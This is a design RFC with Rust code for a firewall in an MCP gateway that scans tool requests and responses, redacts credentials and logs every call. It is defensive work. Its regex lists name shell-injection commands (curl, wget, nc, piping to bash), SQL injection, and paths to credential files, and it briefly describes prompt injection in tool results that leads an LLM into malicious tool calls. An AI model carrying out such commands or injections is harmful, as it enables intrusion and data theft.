# RFC-0071: MCP Security Firewall

**Status**: Draft
**Authors**: Mikko Parkkola
**Created**: 2026-03-13
**Target**: mcp-gateway v2.6.0
**LOC Budget**: 800-1200 LOC
**Feature Gate**: `#[cfg(feature = "firewall")]` (default-enabled)

---

## 1. Problem Statement

### 1.1 The Threat Landscape

MCP servers are the new attack surface. In early 2026:

- **CVE-2025-6514** affected 437,000 MCP server downloads (CVSS 9.6) --
  malicious tool definitions could execute arbitrary code
- **8,000+ MCP servers** exposed on `0.0.0.0` per Shodan scans
- **CyberArk research** documented prompt injection via tool results: a
  compromised MCP server returns text that manipulates the LLM into calling
  further tools with malicious arguments
- **Doyensec MCP AuthN/Z audit** (our Issue #100) identified rug-pull attacks,
  scope collision, and response-based prompt injection

### 1.2 The Gateway Opportunity

mcp-gateway sits in EVERY tool request path:

```
LLM Client --> [GATEWAY] --> MCP Server
     <--        <--              <--
   response   INSPECTION     tool result
              POINT
```

This is the natural enforcement point for a security firewall because:
1. Every tool call passes through the gateway regardless of backend
2. The gateway has full visibility into both request args AND response content
3. Centralized policy avoids per-server configuration fragmentation
4. The gateway already has auth, sanitization, and policy infrastructure

### 1.3 What No One Does

| Existing Solution | Request Scan | Response Scan | Anomaly Detection | Audit Log |
|-------------------|:---:|:---:|:---:|:---:|
| mcp-proxy | - | - | - | - |
| mcp-gateway (current) | partial | partial | - | partial |
| mcp-auth | auth only | - | - | - |
| Custom middleware | varies | - | - | varies |
| **This RFC** | **FULL** | **FULL** | **YES** | **FULL** |

The novel contributions:

1. **Response scanning**: No MCP gateway scans tool OUTPUTS for credentials,
   PII, or prompt injection before they reach the LLM. Everyone scans inputs;
   nobody scans the reverse direction.

2. **Sequence anomaly detection**: Using the existing `TransitionTracker`
   (src/transition.rs) to detect suspicious tool call patterns
   (recon->data_access->exfiltration chains). This is security application
   of usage analytics -- nobody in the MCP ecosystem does this.

3. **Prompt injection in tool results**: Most prompt injection defenses protect
   LLM inputs. Tool results that manipulate the LLM are an underexplored
   vector. Our `ResponseScanner` already detects 23 patterns; the firewall
   makes it an enforcement point rather than just a detector.

---

## 2. Architecture

### 2.1 Firewall Pipeline

The firewall is a middleware layer that wraps every tool invocation. It
operates in two phases: pre-invocation (request scan) and post-invocation
(response scan).

```
Client Request
      |
      v
+-----+-------------------------------------------+
|                  FIREWALL LAYER                   |
|                                                   |
|  +--PRE-INVOCATION PIPELINE--+                   |
|  |                           |                   |
|  | 1. Tool Policy Check      | <-- ToolPolicy   |
|  |    (existing, enhanced)   |     (policy.rs)   |
|  |                           |                   |
|  | 2. Request Arg Scan       | <-- InputScanner  |
|  |    - Shell injection      |     (NEW)         |
|  |    - Path traversal       |                   |
|  |    - SQL injection        |                   |
|  |    - SSRF URL patterns    |                   |
|  |                           |                   |
|  | 3. Sequence Anomaly Check | <-- transition.rs |
|  |    (optional, warn-only)  |     (EXISTING)    |
|  |                           |                   |
|  +---------------------------+                   |
|               | PASS                             |
|               v                                  |
|      [Forward to Backend]                        |
|               |                                  |
|               v                                  |
|  +--POST-INVOCATION PIPELINE-+                   |
|  |                           |                   |
|  | 4. Response Content Scan  | <-- ResponseScanner|
|  |    - Credential patterns  |     (EXISTING,    |
|  |    - PII detection        |      enhanced)    |
|  |    - Prompt injection     |                   |
|  |                           |                   |
|  | 5. Redaction (optional)   | <-- Redactor (NEW)|
|  |    - Replace credentials  |                   |
|  |      with [REDACTED]      |                   |
|  |                           |                   |
|  +---------------------------+                   |
|               |                                  |
|  +--ALWAYS--+                                    |
|  | 6. Audit Log              | <-- AuditLogger   |
|  |    (NDJSON, every call)   |     (NEW)         |
|  +---------------------------+                   |
+--------------------------------------------------+
      |
      v
Client Response
```

### 2.2 Integration with Existing Security Modules

The firewall does NOT replace existing modules. It COMPOSES them into a
unified enforcement layer with configurable actions.

```
EXISTING (src/security/)                FIREWALL (NEW)
+-------------------+                  +----------------------+
| sanitize.rs       | <--used-by----  | InputScanner         |
| - null bytes      |                 | - shell injection    |
| - control chars   |                 | - path traversal     |
| - NFC normalize   |                 | - SQL injection      |
+-------------------+                 +----------------------+
| response_scanner  | <--used-by----  | ResponseFirewall     |
| - 23 PI patterns  |                 | - adds credential    |
| - JSON recursive  |                 |   redaction layer    |
+-------------------+                 | - adds PII scan      |
| tool_integrity    | <--used-by----  +----------------------+
| - rug-pull detect |                 | AnomalyDetector      |
+-------------------+                 | - uses TransitionTr. |
| data_flow.rs      | <--used-by----  | - sequence patterns  |
| - arg hashing     |                 +----------------------+
| - flow tracing    |                 | AuditLogger          |
+-------------------+                 | - NDJSON per call    |
| policy.rs         | <--used-by----  | - caller identity    |
| - allow/deny      |                 | - args hash          |
| - default deny    |                 | - result hash        |
+-------------------+                 | - policy decisions   |
| ssrf.rs           | <--used-by----  +----------------------+
| - IP range check  |
+-------------------+
```

### 2.3 Decision Engine: Warn vs Block

The firewall uses a three-tier action model to minimize false positives
while maintaining security:

```
CONFIDENCE TIERS:

  HIGH confidence (deterministic patterns):
    - Known credential formats (AWS keys, GitHub tokens)
    - Null bytes, control characters
    - Explicit shell metacharacters in non-shell tools
    ACTION: BLOCK (Error returned to client)

  MEDIUM confidence (heuristic patterns):
    - Path traversal sequences (../)
    - SQL keywords in non-SQL tools
    - Prompt injection patterns in responses
    ACTION: WARN (log + allow, annotate response with warning header)

  LOW confidence (statistical anomaly):
    - Unusual tool sequence patterns
    - First-seen tool argument shapes
    ACTION: LOG (audit trail only)
```

Zero false-positive tolerance for blocking means: when in doubt, WARN, don't
BLOCK. Operators can promote WARN to BLOCK via config for specific patterns.

---

## 3. Rust Type Definitions

### 3.1 Firewall Core (src/security/firewall/mod.rs)

```rust
//! MCP Security Firewall — unified request/response inspection layer.
//!
//! Composes existing security modules (sanitize, response_scanner, policy,
//! ssrf, data_flow, tool_integrity) into a single enforcement point with
//! configurable actions and structured audit logging.

use std::sync::Arc;
use std::path::PathBuf;

use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::security::{ResponseScanner, ToolPolicy};
use crate::transition::TransitionTracker;

pub mod audit;
pub mod input_scanner;
pub mod redactor;
pub mod anomaly;

/// Firewall configuration, loaded from gateway.yaml `security.firewall`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct FirewallConfig {
    /// Master enable switch.
    pub enabled: bool,
    /// Scan tool invocation arguments for injection patterns.
    pub scan_requests: bool,
    /// Scan tool response content for credentials, PII, prompt injection.
    pub scan_responses: bool,
    /// Detect prompt injection patterns in tool outputs.
    pub prompt_injection_detection: bool,
    /// Detect and optionally redact credentials in responses.
    pub credential_redaction: bool,
    /// Use tool sequence data for anomaly detection (warn-only).
    pub anomaly_detection: bool,
    /// Path to the NDJSON audit log file.
    pub audit_log: Option<PathBuf>,
    /// Per-tool/per-pattern policy overrides.
    #[serde(default)]
    pub rules: Vec<FirewallRule>,
    /// Minimum anomaly score (0.0-1.0) to emit a warning.
    #[serde(default = "default_anomaly_threshold")]
    pub anomaly_threshold: f64,
}

fn default_anomaly_threshold() -> f64 {
    0.7
}

impl Default for FirewallConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            scan_requests: true,
            scan_responses: true,
            prompt_injection_detection: true,
            credential_redaction: true,
            anomaly_detection: false, // opt-in: needs transition data
            audit_log: None,
            rules: Vec::new(),
            anomaly_threshold: default_anomaly_threshold(),
        }
    }
}

/// A firewall rule: match tool/pattern and override the default action.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FirewallRule {
    /// Glob pattern matching tool names (e.g., "exec_*", "*_delete*", "*").
    #[serde(rename = "match")]
    pub tool_match: String,
    /// Action to take when a threat is detected.
    pub action: FirewallAction,
    /// Optional human-readable reason for the rule.
    #[serde(default)]
    pub reason: Option<String>,
    /// Which scans to apply to matching tools.
    #[serde(default)]
    pub scan: Vec<ScanType>,
}

/// Action the firewall takes when a threat is detected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FirewallAction {
    /// Allow the request/response (audit log only).
    Allow,
    /// Allow but emit a warning in logs and response annotations.
    Warn,
    /// Block the request and return an error to the client.
    Block,
    // NOTE: RequireApproval (interactive approval via gateway meta-tool)
    // is deferred to a future RFC. It requires a bidirectional approval
    // channel and UX design that is out of scope for the initial firewall.
}

/// Types of scans that can be applied.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ScanType {
    /// Scan for credential patterns (AWS keys, API tokens, etc.)
    Credentials,
    /// Scan for PII patterns (emails, phone numbers, SSNs)
    Pii,
    /// Scan for prompt injection patterns
    PromptInjection,
    /// Scan for shell injection in arguments
    ShellInjection,
    /// Scan for path traversal in arguments
    PathTraversal,
    /// Scan for SQL injection in arguments
    SqlInjection,
    /// Anomaly detected in tool call sequence
    SequenceAnomaly,
}

/// Compiled firewall engine — the runtime enforcement point.
///
/// Created once at gateway startup from `FirewallConfig`. Thread-safe.
pub struct Firewall {
    config: FirewallConfig,
    /// Compiled tool-match rules (glob -> action).
    rules: Vec<CompiledRule>,
    /// Reuse existing response scanner for prompt injection.
    response_scanner: ResponseScanner,
    /// Input pattern scanner for request arguments.
    input_scanner: input_scanner::InputScanner,
    /// Credential/PII redactor for response content.
    redactor: redactor::Redactor,
    /// Anomaly detector using transition data.
    anomaly: Option<anomaly::AnomalyDetector>,
    /// Structured audit logger.
    audit: Option<audit::AuditLogger>,
}

/// A compiled firewall rule with pre-processed glob pattern.
///
/// Uses `glob::Pattern` for full glob support (not just prefix matching).
/// Supports `*`, `?`, `[abc]`, `[!abc]`, and `{a,b}` patterns.
struct CompiledRule {
    /// Compiled glob pattern for tool name matching.
    pattern: glob::Pattern,
    /// The action to take
    action: FirewallAction,
    /// Scans to apply
    scans: Vec<ScanType>,
    /// Human-readable reason
    reason: Option<String>,
}

/// Verdict from the firewall for a single tool invocation.
#[derive(Debug, Clone)]
pub struct FirewallVerdict {
    /// Whether the request is allowed to proceed.
    pub allowed: bool,
    /// Action taken (for logging/response annotation).
    pub action: FirewallAction,
    /// Findings from all scans.
    pub findings: Vec<Finding>,
    /// Anomaly score (if anomaly detection is enabled).
    pub anomaly_score: Option<f64>,
}

/// A single finding from a scan.
#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    /// Which scan produced this finding.
    pub scan_type: ScanType,
    /// Severity: high (block), medium (warn), low (log).
    pub severity: Severity,
    /// Human-readable description.
    pub description: String,
    /// The matched pattern or fragment (truncated for logging).
    pub matched: String,
    /// Where the finding was detected (request args or response content).
    pub location: FindingLocation,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    High,
    Medium,
    Low,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingLocation {
    /// Found in tool invocation arguments
    RequestArgs,
    /// Found in tool response content
    ResponseContent,
    /// Derived from tool call sequence patterns
    SequenceAnomaly,
}

impl Firewall {
    /// Create a new firewall from config.
    ///
    /// Compiles all rules, initializes scanners, opens audit log.
    pub fn from_config(
        config: FirewallConfig,
        transition_tracker: Option<Arc<TransitionTracker>>,
    ) -> Self {
        let rules = config.rules.iter().map(compile_rule).collect();
        let response_scanner = ResponseScanner::new();
        let input_scanner = input_scanner::InputScanner::new();
        let redactor = redactor::Redactor::new();
        let anomaly = if config.anomaly_detection {
            transition_tracker.map(|tt| anomaly::AnomalyDetector::new(tt, config.anomaly_threshold))
        } else {
            None
        };
        let audit = config.audit_log.as_ref().map(|path| {
            audit::AuditLogger::new(path).unwrap_or_else(|e| {
                tracing::warn!("Cannot open audit log {}: {e}", path.display());
                audit::AuditLogger::stderr()
            })
        });

        Self {
            config,
            rules,
            response_scanner,
            input_scanner,
            redactor,
            anomaly,
            audit,
        }
    }

    /// Pre-invocation check: scan request arguments.
    ///
    /// Returns a verdict. If `allowed` is false, the caller MUST NOT
    /// forward the request to the backend.
    pub fn check_request(
        &self,
        session_id: &str,
        server: &str,
        tool: &str,
        args: &Value,
        caller: &str,
    ) -> FirewallVerdict {
        if !self.config.enabled || !self.config.scan_requests {
            return FirewallVerdict::allow();
        }

        let mut findings = Vec::new();

        // 1. Input pattern scan
        if let Value::Object(map) = args {
            findings.extend(self.input_scanner.scan_args(map));
        }

        // 2. Anomaly detection
        let anomaly_score = self.anomaly.as_ref().map(|a| {
            a.score_transition(session_id, server, tool)
        });

        if let Some(score) = anomaly_score {
            if score >= self.config.anomaly_threshold {
                findings.push(Finding {
                    scan_type: ScanType::SequenceAnomaly,
                    severity: Severity::Low,
                    description: format!("Unusual tool sequence (anomaly score: {score:.2})"),
                    matched: format!("{server}:{tool}"),
                    location: FindingLocation::SequenceAnomaly,
                });
            }
        }

        // 3. Determine action from rules + severity
        let action = self.resolve_action(tool, &findings);
        let allowed = action != FirewallAction::Block;

        let verdict = FirewallVerdict {
            allowed,
            action,
            findings: findings.clone(),
            anomaly_score,
        };

        // 4. Audit log
        if let Some(ref audit) = self.audit {
            audit.log_request(session_id, server, tool, caller, args, &verdict);
        }

        verdict
    }

    /// Post-invocation check: scan response content.
    ///
    /// May redact credentials/PII from the response value (returns
    /// the potentially-modified value).
    pub fn check_response(
        &self,
        session_id: &str,
        server: &str,
        tool: &str,
        response: &mut Value,
        caller: &str,
    ) -> FirewallVerdict {
        if !self.config.enabled || !self.config.scan_responses {
            return FirewallVerdict::allow();
        }

        let mut findings = Vec::new();

        // 1. Prompt injection detection (reuse ResponseScanner).
        //    ResponseScanner::scan_response() takes &Value (immutable borrow).
        //    Reborrow immutably via &*response first, before passing &mut
        //    to the Redactor in step 2.
        if self.config.prompt_injection_detection {
            let pi_matches = self.response_scanner.scan_response(server, tool, &*response);
            for m in pi_matches {
                findings.push(Finding {
                    scan_type: ScanType::PromptInjection,
                    severity: Severity::Medium,
                    description: m.pattern_description,
                    matched: m.matched_fragment,
                    location: FindingLocation::ResponseContent,
                });
            }
        }

        // 2. Credential detection + redaction (takes &mut Value for in-place redaction)
        if self.config.credential_redaction {
            let cred_findings = self.redactor.scan_and_redact(response);
            findings.extend(cred_findings);
        }

        // 3. Determine action
        let action = self.resolve_action(tool, &findings);
        let allowed = action != FirewallAction::Block;

        let verdict = FirewallVerdict {
            allowed,
            action,
            findings: findings.clone(),
            anomaly_score: None,
        };

        // 4. Audit log
        if let Some(ref audit) = self.audit {
            audit.log_response(session_id, server, tool, caller, &verdict);
        }

        verdict
    }

    /// Match tool name against rules, pick the highest-severity action.
    fn resolve_action(&self, tool: &str, findings: &[Finding]) -> FirewallAction {
        // If no findings, allow
        if findings.is_empty() {
            return FirewallAction::Allow;
        }

        // Check if any rule matches this tool
        for rule in &self.rules {
            if rule_matches(rule, tool) {
                return rule.action;
            }
        }

        // Default: highest severity finding determines action
        let max_severity = findings.iter().map(|f| f.severity).min_by_key(|s| match s {
            Severity::High => 0,
            Severity::Medium => 1,
            Severity::Low => 2,
        });

        match max_severity {
            Some(Severity::High) => FirewallAction::Block,
            Some(Severity::Medium) => FirewallAction::Warn,
            _ => FirewallAction::Allow,
        }
    }
}

impl FirewallVerdict {
    fn allow() -> Self {
        Self {
            allowed: true,
            action: FirewallAction::Allow,
            findings: Vec::new(),
            anomaly_score: None,
        }
    }
}

fn compile_rule(rule: &FirewallRule) -> CompiledRule {
    let pattern = glob::Pattern::new(&rule.tool_match)
        .unwrap_or_else(|_| glob::Pattern::new("*").unwrap());
    CompiledRule {
        pattern,
        action: rule.action,
        scans: rule.scan.clone(),
        reason: rule.reason.clone(),
    }
}

fn rule_matches(rule: &CompiledRule, tool: &str) -> bool {
    rule.pattern.matches(tool)
}
```

### 3.2 Input Scanner (src/security/firewall/input_scanner.rs)

```rust
//! Request argument scanning for injection patterns.
//!
//! Detects shell injection, path traversal, SQL injection, and SSRF
//! patterns in tool invocation arguments.

use regex::RegexSet;
use serde_json::{Map, Value};

use super::{Finding, FindingLocation, ScanType, Severity};

/// Pre-compiled input pattern scanner.
pub struct InputScanner {
    shell_patterns: RegexSet,
    path_patterns: RegexSet,
    sql_patterns: RegexSet,
}

const SHELL_PATTERNS: &[&str] = &[
    r";\s*(?:rm|cat|curl|wget|nc|bash|sh|python|perl|ruby)\s",
    r"\$\(.*\)",                      // command substitution
    r"`[^`]+`",                       // backtick execution
    r"\|\s*(?:sh|bash|zsh|fish)\b",   // pipe to shell
    r"&&\s*(?:rm|curl|wget|nc)\s",    // chained destructive
    r">\s*/(?:etc|tmp|dev|proc)/",    // redirect to system paths
];

const PATH_TRAVERSAL_PATTERNS: &[&str] = &[
    r"\.\./",                          // basic traversal
    r"\.\.\%2[fF]",                    // URL-encoded traversal
    r"\.\.\%5[cC]",                    // URL-encoded backslash
    r"(?i)/etc/(?:passwd|shadow|hosts)",// sensitive file access
    r"(?i)/proc/self/",               // proc filesystem
    r"~/.ssh/",                        // SSH keys
];

const SQL_PATTERNS: &[&str] = &[
    r"(?i)'\s*(?:OR|AND)\s+\d+\s*=\s*\d+",           // tautology
    r"(?i)(?:UNION\s+SELECT|INSERT\s+INTO|DROP\s+TABLE)",// DDL/DML
    r"(?i);\s*(?:DROP|DELETE|UPDATE|INSERT)\s",         // stacked queries
    r"(?i)--\s*$",                                      // comment termination
];

impl InputScanner {
    pub fn new() -> Self {
        Self {
            shell_patterns: RegexSet::new(SHELL_PATTERNS)
                .expect("Shell patterns must compile"),
            path_patterns: RegexSet::new(PATH_TRAVERSAL_PATTERNS)
                .expect("Path patterns must compile"),
            sql_patterns: RegexSet::new(SQL_PATTERNS)
                .expect("SQL patterns must compile"),
        }
    }

    /// Scan all string values in a tool's argument map.
    pub fn scan_args(&self, args: &Map<String, Value>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for (key, value) in args {
            self.scan_value_recursive(key, value, &mut findings);
        }
        findings
    }

    fn scan_value_recursive(
        &self,
        key: &str,
        value: &Value,
        findings: &mut Vec<Finding>,
    ) {
        match value {
            Value::String(s) => {
                self.scan_string(key, s, findings);
            }
            Value::Array(arr) => {
                for item in arr {
                    self.scan_value_recursive(key, item, findings);
                }
            }
            Value::Object(map) => {
                for (k, v) in map {
                    self.scan_value_recursive(k, v, findings);
                }
            }
            _ => {}
        }
    }

    fn scan_string(&self, key: &str, value: &str, findings: &mut Vec<Finding>) {
        let fragment = truncate(value, 200);

        // Shell injection (HIGH severity)
        if self.shell_patterns.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::ShellInjection,
                severity: Severity::High,
                description: format!("Shell injection pattern in argument '{key}'"),
                matched: fragment.clone(),
                location: FindingLocation::RequestArgs,
            });
        }

        // Path traversal (HIGH severity)
        if self.path_patterns.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::PathTraversal,
                severity: Severity::High,
                description: format!("Path traversal pattern in argument '{key}'"),
                matched: fragment.clone(),
                location: FindingLocation::RequestArgs,
            });
        }

        // SQL injection (MEDIUM severity -- many false positives)
        if self.sql_patterns.is_match(value) {
            findings.push(Finding {
                scan_type: ScanType::SqlInjection,
                severity: Severity::Medium,
                description: format!("SQL injection pattern in argument '{key}'"),
                matched: fragment,
                location: FindingLocation::RequestArgs,
            });
        }
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}
```

### 3.3 Redactor (src/security/firewall/redactor.rs)

```rust
//! Credential and PII detection + redaction in tool response content.
//!
//! Scans JSON response values for sensitive patterns and replaces them
//! with `[REDACTED:<type>]` markers before the response reaches the LLM.

use regex::{Regex, RegexSet};
use serde_json::Value;

use super::{Finding, FindingLocation, ScanType, Severity};

pub struct Redactor {
    /// Fast multi-pattern matcher for detection (single DFA pass).
    credential_patterns: RegexSet,
    /// Individual compiled regexes for targeted replacement via replace_all.
    credential_regexes: Vec<Regex>,
    credential_descriptions: Vec<&'static str>,
}

const CREDENTIAL_PATTERNS: &[(&str, &str)] = &[
    // AWS
    (r"(?:AKIA|ASIA)[A-Z0-9]{16}", "AWS Access Key ID"),
    // GitHub
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Access Token"),
    (r"gho_[A-Za-z0-9]{36}", "GitHub OAuth Token"),
    (r"ghs_[A-Za-z0-9]{36}", "GitHub App Token"),
    (r"ghr_[A-Za-z0-9]{36}", "GitHub Refresh Token"),
    // Slack
    (r"xox[bprs]-[A-Za-z0-9-]{10,}", "Slack Token"),
    // Generic API keys
    (r"(?i)(?:api[_-]?key|apikey|secret[_-]?key)\s*[:=]\s*['\"][A-Za-z0-9+/=]{20,}['\"]",
     "Generic API Key in key=value"),
    // JWT (3-part base64 with dots)
    (r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
     "JSON Web Token"),
    // Private keys
    (r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----", "Private Key"),
    // Bearer tokens in response text
    (r"(?i)bearer\s+[A-Za-z0-9._~+/=-]{20,}", "Bearer Token"),
    // Connection strings
    (r"(?i)(?:postgres|mysql|mongodb|redis)://[^\s]{10,}", "Database Connection String"),
];

impl Redactor {
    pub fn new() -> Self {
        let patterns: Vec<&str> = CREDENTIAL_PATTERNS.iter().map(|(p, _)| *p).collect();
        let descriptions: Vec<&str> = CREDENTIAL_PATTERNS.iter().map(|(_, d)| *d).collect();
        let regexes: Vec<Regex> = patterns.iter()
            .map(|p| Regex::new(p).expect("Credential pattern must compile"))
            .collect();

        Self {
            credential_patterns: RegexSet::new(&patterns)
                .expect("Credential patterns must compile"),
            credential_regexes: regexes,
            credential_descriptions: descriptions,
        }
    }

    /// Scan a JSON value for credentials. If found, redact in-place and
    /// return findings.
    pub fn scan_and_redact(&self, value: &mut Value) -> Vec<Finding> {
        let mut findings = Vec::new();
        self.scan_recursive(value, &mut findings);
        findings
    }

    fn scan_recursive(&self, value: &mut Value, findings: &mut Vec<Finding>) {
        match value {
            Value::String(s) => {
                let matches: Vec<usize> = self.credential_patterns
                    .matches(s.as_str())
                    .into_iter()
                    .collect();

                if !matches.is_empty() {
                    for idx in &matches {
                        findings.push(Finding {
                            scan_type: ScanType::Credentials,
                            severity: Severity::High,
                            description: format!(
                                "Credential detected: {}",
                                self.credential_descriptions[*idx]
                            ),
                            matched: truncate(s, 40),
                            location: FindingLocation::ResponseContent,
                        });
                    }
                    // Redact: use Regex::replace_all for targeted replacement.
                    // Only the matched credential spans are replaced, preserving
                    // surrounding text (e.g., "token: ghp_xxx rest" -> "token: [REDACTED:credential] rest").
                    let mut redacted = s.clone();
                    for idx in &matches {
                        redacted = self.credential_regexes[*idx]
                            .replace_all(&redacted, "[REDACTED:credential]")
                            .into_owned();
                    }
                    *s = redacted;
                }
            }
            Value::Array(arr) => {
                for item in arr.iter_mut() {
                    self.scan_recursive(item, findings);
                }
            }
            Value::Object(map) => {
                for val in map.values_mut() {
                    self.scan_recursive(val, findings);
                }
            }
            _ => {}
        }
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max])
    } else {
        s.to_string()
    }
}
```

### 3.4 Anomaly Detector (src/security/firewall/anomaly.rs)

```rust
//! Tool sequence anomaly detection using transition probability data.
//!
//! Uses the existing TransitionTracker to score how "unusual" a tool
//! invocation is given the previous tool in the session.

use std::collections::HashMap;
use std::sync::Arc;
use parking_lot::Mutex;
use crate::transition::TransitionTracker;

pub struct AnomalyDetector {
    tracker: Arc<TransitionTracker>,
    threshold: f64,
    /// Per-session tracking of the last tool invoked, so we can compute
    /// P(current_tool | last_tool) rather than P(successor | current_tool).
    ///
    /// **Session teardown**: Remove session entry from `last_tools` on
    /// disconnect. Register via session lifecycle hook.
    last_tool: Mutex<HashMap<String, String>>,
}

impl AnomalyDetector {
    pub fn new(tracker: Arc<TransitionTracker>, threshold: f64) -> Self {
        Self {
            tracker,
            threshold,
            last_tool: Mutex::new(HashMap::new()),
        }
    }

    /// Score a tool invocation: 0.0 = perfectly normal, 1.0 = never seen.
    ///
    /// Computes P(current_tool | last_tool_in_session). If the current tool
    /// does NOT appear in the predicted successors of the previous tool,
    /// it is anomalous. Updates the per-session last_tool after scoring.
    pub fn score_transition(
        &self,
        session_id: &str,
        server: &str,
        tool: &str,
    ) -> f64 {
        let current = format!("{server}:{tool}");
        let mut sessions = self.last_tool.lock();

        let score = match sessions.get(session_id) {
            None => {
                // First tool in session: no previous context, neutral score
                0.5
            }
            Some(prev_tool) => {
                // predict_next(prev_tool) returns likely successors.
                // Check if current_tool is among them.
                let predictions = self.tracker.predict_next(prev_tool, 0.0, 20);

                if predictions.is_empty() {
                    // Cold start for this predecessor: no data -> neutral
                    0.5
                } else {
                    match predictions.iter().find(|p| p.tool == current) {
                        Some(p) => 1.0 - p.confidence,
                        None => 0.95, // Never seen after prev_tool
                    }
                }
            }
        };

        // Update last_tool for this session
        sessions.insert(session_id.to_string(), current);
        score
    }
}
```

### 3.5 Audit Logger (src/security/firewall/audit.rs)

```rust
//! Structured NDJSON audit log for every tool invocation through the firewall.

use std::fs::{File, OpenOptions};
use std::io::{self, BufWriter, Write};
use std::path::Path;
use std::sync::Mutex;

use chrono::Utc;
use serde::Serialize;
use serde_json::Value;

use super::{Finding, FirewallAction, FirewallVerdict};
use crate::security::hash_argument;

pub struct AuditLogger {
    writer: Mutex<Box<dyn Write + Send>>,
}

#[derive(Serialize)]
struct AuditEntry<'a> {
    timestamp: String,
    event: &'a str,
    session_id: &'a str,
    server: &'a str,
    tool: &'a str,
    caller: &'a str,
    args_hash: Option<String>,
    action: &'a str,
    findings_count: usize,
    findings: &'a [Finding],
    anomaly_score: Option<f64>,
}

impl AuditLogger {
    /// Open an audit log file for append-only writing.
    pub fn new(path: &Path) -> io::Result<Self> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)?;
        Ok(Self {
            writer: Mutex::new(Box::new(BufWriter::new(file))),
        })
    }

    /// Create a logger that writes to stderr (fallback).
    pub fn stderr() -> Self {
        Self {
            writer: Mutex::new(Box::new(io::stderr())),
        }
    }

    pub fn log_request(
        &self,
        session_id: &str,
        server: &str,
        tool: &str,
        caller: &str,
        args: &Value,
        verdict: &FirewallVerdict,
    ) {
        let entry = AuditEntry {
            timestamp: Utc::now().to_rfc3339(),
            event: "request",
            session_id,
            server,
            tool,
            caller,
            args_hash: Some(hash_argument(args)),
            action: action_str(verdict.action),
            findings_count: verdict.findings.len(),
            findings: &verdict.findings,
            anomaly_score: verdict.anomaly_score,
        };
        self.write_entry(&entry);
    }

    pub fn log_response(
        &self,
        session_id: &str,
        server: &str,
        tool: &str,
        caller: &str,
        verdict: &FirewallVerdict,
    ) {
        let entry = AuditEntry {
            timestamp: Utc::now().to_rfc3339(),
            event: "response",
            session_id,
            server,
            tool,
            caller,
            args_hash: None,
            action: action_str(verdict.action),
            findings_count: verdict.findings.len(),
            findings: &verdict.findings,
            anomaly_score: verdict.anomaly_score,
        };
        self.write_entry(&entry);
    }

    fn write_entry<T: Serialize>(&self, entry: &T) {
        if let Ok(json) = serde_json::to_string(entry) {
            if let Ok(mut w) = self.writer.lock() {
                let _ = writeln!(w, "{json}");
                let _ = w.flush();
            }
        }
    }
}

fn action_str(action: FirewallAction) -> &'static str {
    match action {
        FirewallAction::Allow => "allow",
        FirewallAction::Warn => "warn",
        FirewallAction::Block => "block",
    }
}
```

---

## 4. Integration Points

### 4.1 Files to Create

| File | Purpose | Approx LOC |
|------|---------|------------|
| `src/security/firewall/mod.rs` | Core engine, config, types, verdict | ~300 |
| `src/security/firewall/input_scanner.rs` | Request argument scanning | ~150 |
| `src/security/firewall/redactor.rs` | Credential detection + redaction | ~120 |
| `src/security/firewall/anomaly.rs` | Sequence anomaly scoring | ~50 |
| `src/security/firewall/audit.rs` | NDJSON audit logger | ~120 |
| `tests/firewall_integration.rs` | Integration test | ~100 |

**Total: ~840 LOC** (within 800-1200 budget)

### 4.2 Files to Modify

| File | Change | LOC Delta |
|------|--------|-----------|
| `src/security/mod.rs` | Add `pub mod firewall;` + re-exports | ~5 |
| `src/config/features.rs` | Add `FirewallConfig` to `SecurityConfig` | ~10 |
| `src/gateway/router/mod.rs` | Add `Arc<Firewall>` to `AppState` | ~5 |
| `src/gateway/router/handlers.rs` | Call `firewall.check_request()` before invoke, `firewall.check_response()` after | ~30 |
| `src/gateway/server.rs` | Construct `Firewall` from config at startup | ~15 |
| `Cargo.toml` | Add `firewall` to default features list | ~1 |

### 4.2.1 New Dependency

```toml
[dependencies]
glob = "0.3"  # Glob pattern matching for firewall rules
```

### 4.3 Existing Code Reused (NOT duplicated)

| Module | What we reuse | How |
|--------|---------------|-----|
| `response_scanner.rs` | 23 prompt injection patterns, `scan_response()` | Call directly from `Firewall::check_response()` |
| `policy.rs` | `ToolPolicy::check()` | Called BEFORE firewall (existing flow unchanged) |
| `data_flow.rs` | `hash_argument()`, `ToolCategory::classify()` | Used in audit log entries |
| `sanitize.rs` | `sanitize_json_value()` | Called BEFORE firewall (existing flow unchanged) |
| `ssrf.rs` | `validate_url_not_ssrf()` | Called from `InputScanner` for URL-like args |
| `transition.rs` | `TransitionTracker::predict_next()` | Used by `AnomalyDetector` |
| `tool_integrity.rs` | `ToolIntegrityChecker` | Runs independently (not composed into firewall) |

---

## 5. Config Schema

Addition to `gateway.yaml`:

```yaml
security:
  # Existing fields (unchanged):
  sanitize_input: true
  ssrf_protection: true
  tool_policy:
    enabled: true
    use_default_deny: true

  # NEW: Firewall configuration
  firewall:
    enabled: true
    scan_requests: true
    scan_responses: true
    prompt_injection_detection: true
    credential_redaction: true
